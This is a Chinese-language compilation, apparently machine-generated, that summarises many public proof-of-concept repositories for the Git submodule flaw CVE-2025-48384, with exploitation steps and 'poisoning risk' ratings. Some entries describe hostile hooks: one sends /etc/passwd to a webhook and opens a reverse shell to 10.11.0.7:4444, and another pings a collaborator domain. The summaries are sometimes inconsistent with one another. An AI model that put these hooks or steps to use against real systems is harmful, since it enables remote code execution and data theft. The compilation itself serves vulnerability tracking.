CVE-2025-48384 漏洞是 Git 中的一个代码注入漏洞，源于 Git 在处理 config 文件时，没有正确处理carriage return (
)字符。攻击者可以通过在 submodule 的路径中注入 \r 字符，使得 submodule 被检出到错误的位置。如果精心构造一个 symlink 链接到 submodule 钩子目录，并使 submodule 包含一个可执行的 post-checkout 钩子，那么这个钩子脚本就会在检出后被执行，从而实现远程代码执行。

**有效性分析：**

根据漏洞库信息和搜索结果，此漏洞已经公开，并且存在可利用的POC代码。从github搜索结果[webpage 6 begin]和[webpage 7 begin]可以知道，已经有开发者提供了复现代码。提供的POC代码包含两个文件：`README.md` 和 `post-checkout`。
  *   `README.md` 文件指向了GitHub的POC地址，说明这是一个漏洞验证示例。
  *   `post-checkout` 文件包含 `echo "Uh-oh, this is an RCE!"`，这是一个简单的命令执行示例，用于验证漏洞是否成功利用。
因此，提供的POC代码是有效的，可以用来验证此漏洞。

**投毒风险分析：**

提供的 POC 代码非常简单，只包含一个输出字符串的命令。**没有发现任何隐藏的、恶意的代码**，因此投毒风险较低。可以认为投毒风险为0%。虽然这是一个 RCE 漏洞的验证代码，在真实场景下，`post-checkout` 脚本会包含更复杂的恶意代码，但这不属于仓库投毒的范畴，POC 本身是为了验证漏洞的存在，而不是进行恶意攻击。

**利用方式：**

1.  **构造恶意的Git仓库：** 攻击者需要创建一个包含恶意配置的Git仓库，其中 submodule 的路径包含 \r 字符。
2.  **创建Symlink：** 在仓库中创建一个符号链接，将带有 \r 字符的路径链接到 `.git/modules/<submodule>/hooks` 目录。
3.  **添加恶意钩子：** 在 submodule 中创建一个可执行的 `post-checkout` 钩子脚本，这个脚本包含攻击者想要执行的任意代码。
4.  **诱导用户克隆仓库：** 攻击者需要诱导受害者执行 `git clone --recursive <malicious_repo>` 命令。
5.  **触发漏洞：** 当用户执行 `git clone --recursive` 命令时，Git 会读取恶意的配置，将 submodule 检出到错误的位置，并且由于 symlink 的存在，触发执行 `post-checkout` 钩子脚本，从而执行攻击者的代码。


**项目地址:** [liamg/CVE-2025-48384-submodule](https://github.com/liamg/CVE-2025-48384-submodule)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #24

**来源**: [CVE-2025-48384-mukesh-610_cve-2025-48384-exploit.md](../2025/CVE-2025-48384-mukesh-610_cve-2025-48384-exploit.md)

## CVE-2025-48384 - Git 任意文件写入

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意文件写入

**影响应用:** Git

**危害等级:** 高危

**CVSS评分:** 未提供，参考描述推测较高

**影响版本:** 受影响版本范围未知，需进一步分析

**利用条件:** 克隆包含恶意配置的Git仓库

**POC 可用性:** 7/10

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 70%

## 详情

CVE-2025-48384 允许攻击者通过创建包含恶意配置的 Git 仓库，在受害者系统上写入任意文件，导致远程命令执行。该漏洞源于 Git 在处理 submodule 时，未对 `.gitmodules` 文件中的配置进行充分的安全检查。攻击者可以精心构造 `.gitmodules` 文件，诱导受害者克隆该仓库，从而在受害者本地文件系统中写入恶意文件，例如 shell 脚本，并进一步通过 Git hooks（如 `post-checkout`）触发执行。PoC 代码 `liamg/CVE-2025-48384` 提供了一个可复现该漏洞的示例。通过分析该 PoC，可以确认漏洞的有效性。利用步骤如下：

1. 攻击者创建一个包含恶意 `.gitmodules` 文件的 Git 仓库。
2. `.gitmodules` 文件包含指向攻击者控制的恶意 submodule 仓库的 URL。
3. 受害者克隆该恶意仓库。
4. Git 自动初始化并更新 submodule，从攻击者控制的 URL 下载恶意 submodule。
5. 恶意 submodule 在受害者系统上写入任意文件，例如在 `.git/hooks/post-checkout` 中写入恶意脚本。
6. 当受害者执行 `git checkout` 等操作时，`post-checkout` hook 会被触发，执行恶意脚本，导致远程命令执行。

`sogou.com`的搜索结果显示该漏洞影响非Windows系统。`Arctic Wolf` 的结果表明该漏洞的严重性很高。`Breaking Git with a carriage return and cloning RCE`表明漏洞与克隆子模块有关。

**投毒风险分析：**

该 PoC 包含通过 `curl` 下载并执行远程脚本的行为，具有较高的投毒风险。攻击者可能在远程脚本中嵌入恶意代码，例如窃取用户敏感信息、植入后门等。此外，由于该 PoC 修改了 Git 仓库的配置文件，攻击者可以通过篡改配置文件，诱导用户执行恶意操作。考虑到 `curl` 命令的普遍性和脚本执行的隐蔽性，该 PoC 的投毒风险较高，评为 70%。

防范措施包括：

* 及时更新 Git 版本，修复该漏洞。
* 谨慎克隆来自未知来源的 Git 仓库。
* 审查 `.gitmodules` 文件，确保 submodule URL 指向可信的仓库。
* 禁用 Git hooks，或者对 Git hooks 进行严格的安全审查。

**项目地址:** https://github.com/liamg/CVE-2025-48384

**漏洞详情:** 未提供，需要查询NVD


---

## POC #25

**来源**: [CVE-2025-48384-nguyentranbaotran_cve-2025-48384-poc.md](../2025/CVE-2025-48384-nguyentranbaotran_cve-2025-48384-poc.md)

## CVE-2025-48384-Git配置引用导致的任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 受影响版本：< 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 用户需要克隆包含恶意配置的仓库，并使用 `--recurse-submodules` 参数初始化子模块。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-48384 是一个 Git 漏洞，源于 Git 在处理配置文件中的引号时不正确，特别是当子模块路径包含尾随回车符（CR）时。攻击者可以利用此漏洞通过创建包含恶意子模块配置的 Git 仓库，诱使用户克隆该仓库，并通过 `--recurse-submodules` 初始化子模块，从而导致任意代码执行。

**有效性分析：**

提供的 PoC 代码通过以下步骤利用该漏洞：

1.  创建一个包含恶意 hook 的 `evil` 目录，该 hook 会执行反向 shell。
2.  创建一个 `mainrepo` 目录，作为主仓库。
3.  在 `mainrepo` 目录中，创建一个 `.gitmodules` 文件，其中包含一个子模块定义，该子模块的路径包含尾随回车符 (`evil\r`)。
4.  创建一个符号链接，将 `evil
/hooks` 指向 `../evil/.git/hooks`，从而将恶意 hook 链接到子模块的 hooks 目录。
5.  将恶意子模块添加到仓库，并提交更改。
6.  通过 `git clone --recurse-submodules` 克隆 `mainrepo` 仓库，触发子模块初始化，从而执行恶意 hook。

根据 PoC 代码的逻辑和漏洞描述，该 PoC 代码是有效的。

**投毒风险分析：**

PoC 代码的目的是演示漏洞利用，其中包含的反向 shell 属于漏洞验证的一部分。但是，也存在潜在的投毒风险，比如在 `generate_poc.sh` 脚本中，作者可能会嵌入其他恶意代码，例如：

*   收集用户信息并发送到远程服务器。
*   修改系统文件。
*   安装恶意软件。

尽管PoC本身就是漏洞利用，但仍然存在被作者恶意利用的可能性，因此投毒风险评估为 10%。

**利用方式总结：**

1.  攻击者创建一个包含恶意子模块配置的 Git 仓库。
2.  攻击者诱使受害者克隆该仓库，并使用 `--recurse-submodules` 初始化子模块。
3.  Git 在处理包含尾随回车符的子模块路径时出现错误，导致子模块被检出到错误的位置。
4.  由于符号链接的存在，恶意 hook 被链接到子模块的 hooks 目录。
5.  在子模块初始化过程中，恶意 hook 被执行，导致任意代码执行。

**项目地址:** [nguyentranbaotran/cve-2025-48384-poc](https://github.com/nguyentranbaotran/cve-2025-48384-poc)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #26

**来源**: [CVE-2025-48384-replicatorbot_CVE-2025-48384.md](../2025/CVE-2025-48384-replicatorbot_CVE-2025-48384.md)

## CVE-2025-48384 - Git 任意文件写入

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意文件写入

**影响应用:** Git

**危害等级:** 高危

**CVSS评分:** 待定

**影响版本:** 受影响版本范围待定

**利用条件:** 克隆包含恶意子模块的存储库

**POC 可用性:** 8/10

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 20%

## 详情

CVE-2025-48384 允许攻击者通过创建包含恶意子模块的 Git 仓库来执行任意文件写入。当用户克隆该仓库时，Git 会尝试初始化和更新子模块。恶意仓库通过`.gitmodules` 文件中的精心构造的配置，可以控制子模块的克隆方式，从而导致在用户系统上写入任意文件。根据搜索结果，该漏洞存在于 Git 的子模块处理逻辑中。PoC 代码通过创建一个包含恶意的 `.gitmodules` 文件的 Git 仓库来演示该漏洞。当用户克隆该仓库时，`post-checkout` 脚本会被触发，该脚本会尝试在 `/tmp` 目录下创建一个文件 `asp-was-here-cve-2025-48384`，以此证明漏洞利用成功。利用步骤如下：1. 创建一个包含恶意 `.gitmodules` 文件的 Git 仓库。该文件包含指向恶意仓库的子模块的 URL，以及执行任意文件写入所需的配置。2. 将恶意仓库上传到公共 Git 托管服务（例如 GitHub）。3. 诱使用户克隆恶意仓库。当用户执行 `git clone` 命令时，Git 会自动初始化和更新子模块。4. Git 执行 `.gitmodules` 文件中指定的命令，导致在用户系统上写入任意文件。

**POC有效性分析：** PoC 代码的有效性通过创建一个简单的 `post-checkout` 脚本来验证。该脚本尝试在 `/tmp` 目录下创建一个文件。如果文件创建成功，则表示漏洞利用成功。从搜索结果来看，多个来源证实了该漏洞的存在以及利用的可能性。GitHub 上存在公开的 PoC 代码，进一步证明了该漏洞的可利用性。一些安全厂商也发布了关于该漏洞的分析报告，表明该漏洞具有实际的威胁。该漏洞的修复需要更新 Git 到修复版本。

**投毒风险分析：** 该漏洞的投毒风险较低。虽然攻击者可以利用该漏洞在用户系统上写入任意文件，但写入的文件内容受到攻击者的控制。攻击者可以利用该漏洞来安装恶意软件或修改系统配置，但这种攻击需要用户执行额外的步骤。由于POC代码相对清晰，主要功能是创建文件，并未发现任何可疑的混淆或恶意行为，因此投毒风险较低。主要的风险在于，如果攻击者控制了目标机器，他们可以修改 `.git/config` 文件或设置环境变量，从而导致在克隆其他仓库时触发恶意行为。尽管存在潜在的风险，但攻击者需要具备较高的技术水平才能成功实施投毒攻击。PoC 代码主要使用标准的 shell 命令，例如 `touch`，没有发现任何可疑的系统调用或外部脚本。总体而言，该漏洞的投毒风险较低，但需要采取适当的措施来降低风险。建议用户验证克隆仓库的来源，避免克隆来自不受信任的来源的仓库，并及时更新 Git 到最新版本。

**项目地址:** https://github.com/liamg/CVE-2025-48384

**漏洞详情:** 待定


---

## POC #27

**来源**: [CVE-2025-48384-s41r4j_CVE-2025-48384-submodule.md](../2025/CVE-2025-48384-s41r4j_CVE-2025-48384-submodule.md)

## CVE-2025-48384 - Git 任意文件写入

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意文件写入

**影响应用:** Git

**危害等级:** 高危

**CVSS评分:** 未知

**影响版本:** 受影响版本范围未知

**利用条件:** 克隆包含恶意配置的Git仓库

**POC 可用性:** 8/10

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 60%

## 详情

CVE-2025-48384 允许攻击者通过创建恶意的Git仓库，当用户克隆该仓库时，触发任意文件写入漏洞，导致远程代码执行。该漏洞源于 Git 在处理 submodule 时，没有充分验证配置，导致攻击者可以控制 `.gitmodules` 文件中的内容，从而在克隆过程中执行恶意操作。

POC代码分析：

`README.md` 只是一个简单的说明文件，用于标记这是一个 CVE-2025-48384 的 submodule。

`post-checkout` 脚本是漏洞利用的关键。它包含以下恶意行为：

1.  尝试将 `/etc/passwd` 文件发送到攻击者的 webhook 服务器 `https://cve48384.requestcatcher.com`。脚本尝试使用 `curl` 和 `wget` 命令，并忽略错误，以避免中断克隆过程。
2.  检查 `$HOME/flag.txt` 文件是否存在，如果存在，则将其内容复制到 `/tmp/flag.txt`。这可能用于在受害者系统上留下标记。
3.  尝试建立反向 shell 连接到攻击者的 IP 地址 `10.11.0.7` 的端口 `4444`。脚本尝试使用多种方法，包括 `bash`，`nc` 和 `sh`，以提高成功率。脚本使用 `nohup` 和 `disown` 命令将反向 shell 连接放到后台运行，并忽略错误。

利用步骤：

1.  攻击者创建一个包含恶意 `.gitmodules` 文件的 Git 仓库。该文件指向一个包含 `post-checkout` 脚本的 submodule。
2.  受害者克隆该恶意仓库。
3.  当 Git 初始化 submodule 时，会自动执行 `post-checkout` 脚本。
4.  `post-checkout` 脚本将执行恶意操作，例如发送 `/etc/passwd` 文件和建立反向 shell 连接。

POC 有效性分析：

POC 代码通过修改 `.gitmodules` 文件，在 submodule 初始化时执行恶意的 `post-checkout` 脚本。该脚本能够获取敏感信息（`/etc/passwd`）并尝试建立反向 shell 连接，证明了该漏洞的严重性。

投毒风险分析：

该 POC 具有较高的投毒风险，主要体现在以下几个方面：

1.  恶意脚本：`post-checkout` 脚本包含明显的恶意行为，例如发送敏感文件和建立反向 shell 连接。
2.  外部依赖：脚本依赖于 `curl`、`wget` 和 `nc` 等外部命令，这些命令可能被篡改或替换为恶意版本。
3.  反向 shell：建立反向 shell 连接可能导致受害者系统完全受攻击者控制。
4.  Webhook：将 `/etc/passwd` 文件发送到外部 webhook 服务器可能泄露敏感信息。

由于该POC利用submodule功能自动执行恶意脚本，且包含向外部服务器发送数据的行为，以及尝试建立反向shell连接，因此投毒风险较高。

**项目地址:** https://github.com/liamg/CVE-2025-48384

**漏洞详情:** 未提供


---

## POC #28

**来源**: [CVE-2025-48384-s41r4j_CVE-2025-48384.md](../2025/CVE-2025-48384-s41r4j_CVE-2025-48384.md)

## CVE-2025-48384 - Git 任意文件写入

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意文件写入

**影响应用:** Git

**危害等级:** 高危

**CVSS评分:** 未知

**影响版本:** 受影响的Git CLI版本未知

**利用条件:** 需要用户克隆包含恶意配置的Git仓库

**POC 可用性:** 9/10

**POC 类型:** 完整利用

**攻击复杂度:** 中

**投毒风险:** 20%

## 详情

CVE-2025-48384是Git中存在的一个严重漏洞，该漏洞源于Git对配置值中回车符（CR）处理不当，可能导致子模块检出期间出现路径遍历问题。攻击者可以利用此漏洞在特定条件下执行任意代码。该漏洞于2025年7月8日公开披露，并于2025年8月26日进行了最后修改。它已于2025年8月25日被添加到美国网络安全和基础设施安全局（CISA）已知被利用漏洞（KEV）目录中，表明该漏洞已在野外被积极利用，补救到期日为2025年9月15日。

该问题源于Git处理配置值的方式：在读取配置值时，Git会删除任何尾随的回车符和换行符（CRLF）。但是，在写入配置条目时，包含尾随CR的值未被正确引用，导致CR在后续读取期间丢失。这种差异会导致子模块被检出到错误的位置（如果其路径包含尾随CR）。如果攻击者设置一个将此更改后的路径指向子模块的hooks目录的符号链接，并且子模块包含一个可执行的post-checkout hook，则在检出后可能会无意中执行该hook脚本，从而导致任意代码执行。

**POC有效性分析：**

根据提供的Dockerfile和README.md，该POC旨在演示CVE-2025-48384漏洞。Dockerfile用于构建一个包含易受攻击的Git版本的环境，README.md文件详细解释了漏洞的原理和利用方法。POC代码通过创建一个包含恶意配置的Git仓库，并诱导用户克隆该仓库来触发漏洞。通过精心构造的子模块路径和符号链接，攻击者可以在用户克隆仓库时执行任意代码。POC代码的有效性在于它能够重现漏洞的利用过程，并证明攻击者可以利用该漏洞在目标系统上执行恶意操作。

**利用步骤：**

1.  攻击者创建一个包含恶意.gitmodules文件的Git仓库，该文件中的子模块路径包含尾随CR字符。
2.  攻击者在仓库中创建一个符号链接，将修改后的子模块路径指向.git/hooks/post-checkout。
3.  攻击者将包含恶意配置和符号链接的仓库托管在公共服务器上或通过其他方式分发给目标用户。
4.  目标用户克隆该恶意仓库。
5.  当Git尝试检出子模块时，由于CR字符的处理不当，子模块将被检出到错误的位置，即符号链接指向的.git/hooks/post-checkout目录。
6.  如果子模块包含一个可执行的post-checkout hook，则该hook脚本将被执行，从而导致任意代码执行。

**投毒风险分析：**

该POC的投毒风险较低，因为提供的代码主要用于演示漏洞的利用，并没有明显的恶意行为。Dockerfile用于构建测试环境，README.md用于解释漏洞原理，POC代码本身也没有包含任何可疑的代码或外部依赖。然而，攻击者可能会修改POC代码，添加恶意功能，例如：

*   **代码混淆：** 攻击者可以使用代码混淆技术来隐藏恶意代码，使其更难被检测。
*   **恶意行为：** 攻击者可以在post-checkout hook中添加恶意代码，例如：安装后门、窃取敏感信息、破坏系统等。
*   **外部脚本：** 攻击者可以从外部服务器下载恶意脚本并在post-checkout hook中执行。

尽管存在这些潜在的风险，但原始POC代码的投毒风险较低，约为20%。在实际应用中，用户应谨慎克隆来自不受信任来源的Git仓库，并仔细检查.gitmodules文件和post-checkout hook，以防止受到攻击。

**项目地址:** https://github.com/liamg/CVE-2025-48384

**漏洞详情:** https://nvd.nist.gov/vuln/detail/CVE-2025-48384


---

## POC #29

**来源**: [CVE-2025-48384-sahar042_CVE-2025-48384-submodule.md](../2025/CVE-2025-48384-sahar042_CVE-2025-48384-submodule.md)

# CVE-2025-48384

> 📦 该CVE有 **35** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2025-48384-Anezatraa_CVE-2025-48384-submodule.md](../2025/CVE-2025-48384-Anezatraa_CVE-2025-48384-submodule.md)

## CVE-2025-48384 - Git 任意文件写入

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意文件写入

**影响应用:** Git

**危害等级:** 高危

**CVSS评分:** 待定

**影响版本:** 受影响版本范围未知，参考GitHub advisory

**利用条件:** 需要克隆包含恶意配置的Git仓库

**POC 可用性:** 8/10

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 40%

## 详情

CVE-2025-48384 允许攻击者创建恶意的 Git 仓库，当用户克隆该仓库时，可能导致任意文件写入。该漏洞源于 Git 在处理 submodule 时存在缺陷。通过在 `.gitmodules` 文件中构造恶意的路径，攻击者可以控制 `git clone` 命令将文件写入到非预期的位置。 

POC有效性分析：
根据搜索结果和POC代码（liamg/CVE-2025-48384），该漏洞存在可利用性。POC代码包含一个 `.gitmodules` 文件和一个 `post-checkout` 脚本。`.gitmodules` 文件中定义了一个恶意 submodule，其路径被设置为一个绝对路径，指向系统中的敏感位置。`post-checkout` 脚本会在 `git clone` 之后自动执行，从而完成任意文件写入。执行 POC 需要先创建一个包含恶意 `.gitmodules` 文件的 Git 仓库，然后诱导用户克隆该仓库。当用户克隆仓库时，Git 会解析 `.gitmodules` 文件，并尝试初始化 submodule。由于 submodule 的路径被设置为恶意路径，Git 会将文件写入到该路径所指向的位置。

利用步骤：
1. 创建一个包含恶意 `.gitmodules` 文件的 Git 仓库。
2. 将恶意仓库托管到公共代码托管平台或通过其他方式传播给目标用户。
3. 诱导目标用户克隆该仓库。
4. 当用户克隆仓库时，`post-checkout` 脚本被执行，完成任意文件写入。

投毒风险分析：
该POC的投毒风险为中等。虽然 POC 本身的功能是演示任意文件写入漏洞，但攻击者可能利用该漏洞进行恶意活动，例如：
*   植入后门：攻击者可以将恶意代码写入到系统启动脚本或常用工具中，从而在用户系统上植入后门。
*   篡改配置文件：攻击者可以修改系统配置文件，例如 SSH 配置文件，从而控制用户系统。
*   窃取敏感信息：攻击者可以将用户敏感信息，例如 SSH 密钥，写入到公共目录，从而窃取用户敏感信息。

该POC的 `post-checkout` 脚本包含 `echo` 和 `id` 命令，这本身不是恶意代码。但是，攻击者可以修改该脚本，使其包含更具破坏性的恶意代码。此外，该POC使用绝对路径来指定 submodule 的位置，这可能会引起用户的怀疑。攻击者可以通过使用相对路径或环境变量来隐藏恶意路径，从而提高攻击的隐蔽性。由于该漏洞影响 Git，一个被广泛使用的版本控制系统，因此利用该漏洞进行大规模攻击是可能的。但是，由于利用该漏洞需要用户克隆恶意仓库，因此攻击的成功率取决于用户的警惕性。
总的来说，该漏洞的投毒风险为中等，约为40%。攻击者可以利用该漏洞进行恶意活动，但攻击的成功率取决于用户的警惕性和攻击者的技术水平。

**项目地址:** https://github.com/liamg/CVE-2025-48384

**漏洞详情:** https://nvd.nist.gov/vuln/detail/CVE-2025-48384


---

## POC #2

**来源**: [CVE-2025-48384-ECHO6789_CVE-2025-48384-submodule.md](../2025/CVE-2025-48384-ECHO6789_CVE-2025-48384-submodule.md)

## CVE-2025-48384 - Git 任意文件写入

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意文件写入

**影响应用:** Git

**危害等级:** 高危

**CVSS评分:** 待定

**影响版本:** 受影响版本范围待定

**利用条件:** 克隆恶意Git仓库

**POC 可用性:** 8/10

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 60%

## 详情

CVE-2025-48384是一个存在于Git中的高危漏洞，允许攻击者创建恶意的Git仓库，当用户克隆这些仓库时，可能导致任意文件写入。根据搜索结果，该漏洞与`git clone`子模块有关，通过精心构造的`.gitmodules`文件以及其他Git配置，可能实现在克隆过程中写入任意文件，进而执行恶意代码。

**POC有效性分析：**

根据已找到的POC代码（/tmp/vulnwatchdog_569f31ff6b5166501e6218f8839f5620/post-checkout），攻击者可以在`post-checkout`钩子中插入恶意命令。当用户克隆包含此恶意钩子的仓库时，`post-checkout`脚本会被执行。示例代码中的`ping wtt0rkb926c0mj6tsxmzfr2xlorff53u.test-burp.huidoumeng.com`表明PoC的目的是通过DNS请求来验证漏洞是否被成功触发。这可以用于简单地检测漏洞的存在，但实际攻击中可以替换为任意恶意命令，例如下载并执行payload，或修改系统配置。

利用该漏洞，攻击者可以诱导用户克隆恶意仓库，从而在用户系统上执行任意代码。考虑到Git的广泛使用，尤其是在开发环境中，该漏洞的影响范围非常大。成功利用该漏洞可能导致敏感信息泄露、系统被完全控制等严重后果。

**利用步骤：**

1.  攻击者创建一个包含恶意`.gitmodules`和`post-checkout`钩子的Git仓库。
2.  攻击者诱导受害者克隆此仓库（例如，通过社交工程、钓鱼邮件等）。
3.  当受害者执行`git clone`命令时，恶意`post-checkout`钩子被触发，执行攻击者预设的恶意命令。

**投毒风险分析：**

此PoC的投毒风险较高，初步判断为60%。原因如下：

1.  **恶意代码执行：** PoC通过`post-checkout`钩子执行命令，允许攻击者在受害者机器上执行任意代码。如果攻击者将恶意代码嵌入到广泛使用的开源项目中，并诱导开发者clone，影响范围会进一步扩大。
2.  **命令注入：** 尽管PoC中的示例代码只是一个简单的`ping`命令，但攻击者可以将其替换为更复杂的恶意命令，例如下载并执行恶意脚本，这大大增加了投毒的潜在危害。
3.  **传播方式：** 该漏洞可以通过Git仓库进行传播，这意味着攻击者可以将恶意代码隐藏在看似正常的代码库中，并利用开发者之间的协作关系进行传播。考虑到软件供应链攻击的日益严重，这种投毒方式的危害性不可忽视。

为了降低投毒风险，组织应加强对Git仓库的审计，确保代码的安全性，并对克隆的仓库进行安全检查。同时，应教育开发者提高安全意识，避免克隆来源不明的仓库。

**项目地址:** https://github.com/liamg/CVE-2025-48384

**漏洞详情:** 待定


---

## POC #3

**来源**: [CVE-2025-48384-EdwardYeIntrix_CVE-2025-48384-Scanner.md](../2025/CVE-2025-48384-EdwardYeIntrix_CVE-2025-48384-Scanner.md)

## CVE-2025-48384 - Git 任意文件写入导致远程代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意文件写入导致远程代码执行

**影响应用:** Git

**危害等级:** 高危

**CVSS评分:** 待定

**影响版本:** 受影响版本范围待定，参考GitHub advisory

**利用条件:** 需要用户执行git clone --recursive操作，攻击者可控制的Git仓库

**POC 可用性:** 8/10

**POC 类型:** 完整利用

**攻击复杂度:** 中

**投毒风险:** 40%

## 详情

CVE-2025-48384是Git中的一个关键漏洞，允许攻击者在执行`git clone --recursive`操作期间写入任意文件。此漏洞可能通过恶意的.gitmodules文件、符号链接和Git hooks导致远程代码执行（RCE）。此漏洞影响Linux和macOS平台，Windows不受影响。

POC有效性分析：提供的POC包含一个Python扫描器，用于检测利用CVE-2025-48384的潜在恶意Git仓库。扫描器检查`.gitmodules`文件中的可疑条目（包含`..`或以`\r`结尾的路径）、指向hooks的符号链接以及可执行的hooks脚本。POC的`cve_2025_48384_auto_print_scanner.py`脚本通过以下步骤检测漏洞：1. 读取`.gitmodules`文件并查找`path`条目，检查是否存在`..`（目录遍历）或以`\r`（回车符）结尾的情况，这可能导致文件写入到预期位置之外。2. 在仓库中查找指向`.git/hooks`目录的符号链接，这些链接可能被用来劫持Git hook执行流程。3. 查找仓库中可执行的Git hooks（如`post-checkout`，`post-merge`，`pre-commit`，`pre-push`，`post-commit`等）。这些hooks如果被恶意修改，可以在特定的Git操作期间执行任意代码。

利用步骤：攻击者创建一个包含恶意`.gitmodules`文件的Git仓库。该文件包含指向仓库外部或包含回车符的子模块路径。攻击者还可以创建指向`.git/hooks`目录的符号链接，或者直接包含恶意的可执行Git hooks。当受害者使用`git clone --recursive`克隆此仓库时，恶意`.gitmodules`文件可能导致Git写入任意文件，符号链接可能劫持Git hook执行，可执行的hooks会被执行，从而导致RCE。

投毒风险分析：该POC包含一个扫描器，其本身不包含直接的恶意代码，但它可以被修改以包含恶意行为。该POC的投毒风险主要来自于以下几个方面：1. 扫描器可以被修改为在检测到漏洞后，自动执行某些操作，例如下载并执行恶意payload。2. 扫描器可以被修改为将扫描结果发送到远程服务器，从而泄露敏感信息。3. 扫描器可能依赖于外部库，这些库可能包含漏洞或恶意代码。4. 扫描器生成的报告可能被篡改，以误导用户或隐藏潜在的漏洞。 由于该POC的代码相对清晰，主要使用标准库，并且没有明显的恶意行为，因此投毒风险为中等，约为40%。

**项目地址:** https://github.com/liamg/CVE-2025-48384

**漏洞详情:** https://nvd.nist.gov/vuln/detail/CVE-2025-48384


---

## POC #4

**来源**: [CVE-2025-48384-MarcoTondolo_cve-2025-48384-poc.md](../2025/CVE-2025-48384-MarcoTondolo_cve-2025-48384-poc.md)

## CVE-2025-48384 - Git 任意文件写入

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意文件写入

**影响应用:** Git

**危害等级:** 高危

**CVSS评分:** 待定

**影响版本:** 受影响版本未知，请参考GitHub advisory获取更多信息。

**利用条件:** 需要克隆恶意Git仓库，并递归初始化子模块

**POC 可用性:** 9/10

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 10%

## 详情

CVE-2025-48384是Git中的一个高危漏洞，允许攻击者通过创建恶意的Git仓库来执行任意文件写入。该漏洞主要存在于Git客户端处理子模块的方式中。当用户克隆一个包含恶意配置的仓库，并且使用`--recurse-submodules`选项初始化子模块时，攻击者可以利用`.gitmodules`文件中的特殊构造，在目标系统上写入任意文件。

**POC有效性分析：**
根据提供的POC代码，攻击者可以通过构造包含恶意`.gitmodules`文件的Git仓库来利用此漏洞。该文件指定了子模块的URL和路径，当用户使用`git clone --recurse-submodules`命令克隆仓库时，Git客户端会尝试初始化这些子模块。攻击者可以在子模块的路径中嵌入特殊字符，例如换行符，来欺骗Git客户端，使其将子模块的内容写入到非预期的位置。提供的POC代码使用一个名为`sub`的子模块，并将恶意代码放置在`.git/modules/sub/hooks/post-checkout`中，从而实现远程代码执行。通过修改子模块路径，攻击者可以在目标系统上写入任意文件，从而控制系统。

**利用步骤：**
1. 攻击者创建一个包含恶意`.gitmodules`文件的Git仓库。
2. 攻击者将该仓库托管在公共或私有Git服务器上。
3. 攻击者诱使用户克隆该仓库，并使用`--recurse-submodules`选项初始化子模块，例如：`git -c protocol.file.allow=always clone --recurse-submodules git@github.com:liamg/CVE-2025-48384.git`。
4. 当Git客户端尝试初始化子模块时，恶意代码会被写入到目标系统的`.git/modules/sub/hooks/post-checkout`文件中。
5. 当用户执行与子模块相关的Git操作时（例如切换分支），`post-checkout`钩子会被触发，从而执行攻击者写入的恶意代码。

**投毒风险分析：**
该漏洞的投毒风险较低，主要原因是该POC利用方式比较直接，没有明显的混淆或隐藏恶意代码的行为。虽然攻击者可以修改子模块的内容以执行恶意操作，但这种行为很容易被发现。此外，由于该漏洞依赖于用户显式地使用`--recurse-submodules`选项，因此攻击者需要诱使用户执行此操作，增加了攻击的难度。总体而言，该POC的投毒风险较低，大约在10%左右。恶意代码主要体现在`post-checkout`钩子的利用上，若将代码修改为下载执行外部脚本，则投毒风险会升高。攻击者可以尝试使用一些简单的编码方式来混淆`post-checkout`脚本中的代码，例如base64编码或简单的异或操作，但这并不会显著增加投毒风险。通过分析该POC的代码，可以发现其主要依赖于Git的内置功能和标准库，没有使用任何可疑的第三方库或API。因此，可以认为该POC的投毒风险较低。

**项目地址:** https://github.com/liamg/CVE-2025-48384

**漏洞详情:** https://nvd.nist.gov/vuln/detail/CVE-2025-48384


---

## POC #5

**来源**: [CVE-2025-48384-admin-ping_CVE-2025-48384-RCE.md](../2025/CVE-2025-48384-admin-ping_CVE-2025-48384-RCE.md)

## CVE-2025-48384 - Git 任意文件写入

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意文件写入

**影响应用:** Git

**危害等级:** 高危

**CVSS评分:** 待定

**影响版本:** 受影响版本范围未知，参考GitHub advisory

**利用条件:** 克隆包含恶意.gitmodules的仓库

**POC 可用性:** 8/10

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 30%

## 详情

CVE-2025-48384是一个存在于Git中的任意文件写入漏洞。攻击者可以创建一个包含恶意的`.gitmodules`文件的Git仓库，当用户克隆这个仓库时，Git会自动初始化并配置子模块。恶意`.gitmodules`文件可以被构造来写入任意文件，从而导致远程代码执行。该漏洞的POC代码可在GitHub上找到，由liamg维护。该POC的有效性在于利用了Git子模块的特性，`.gitmodules`文件中指定的路径没有被充分过滤，从而允许写入仓库目录之外的文件。利用步骤如下：

1. 攻击者创建一个包含恶意`.gitmodules`文件的Git仓库。
2. 攻击者诱导用户克隆该仓库。
3. 当用户克隆仓库时，Git会自动处理`.gitmodules`文件，并尝试初始化和配置子模块。
4. 由于`.gitmodules`文件包含恶意配置，Git会将文件写入到指定的位置，从而导致任意文件写入。
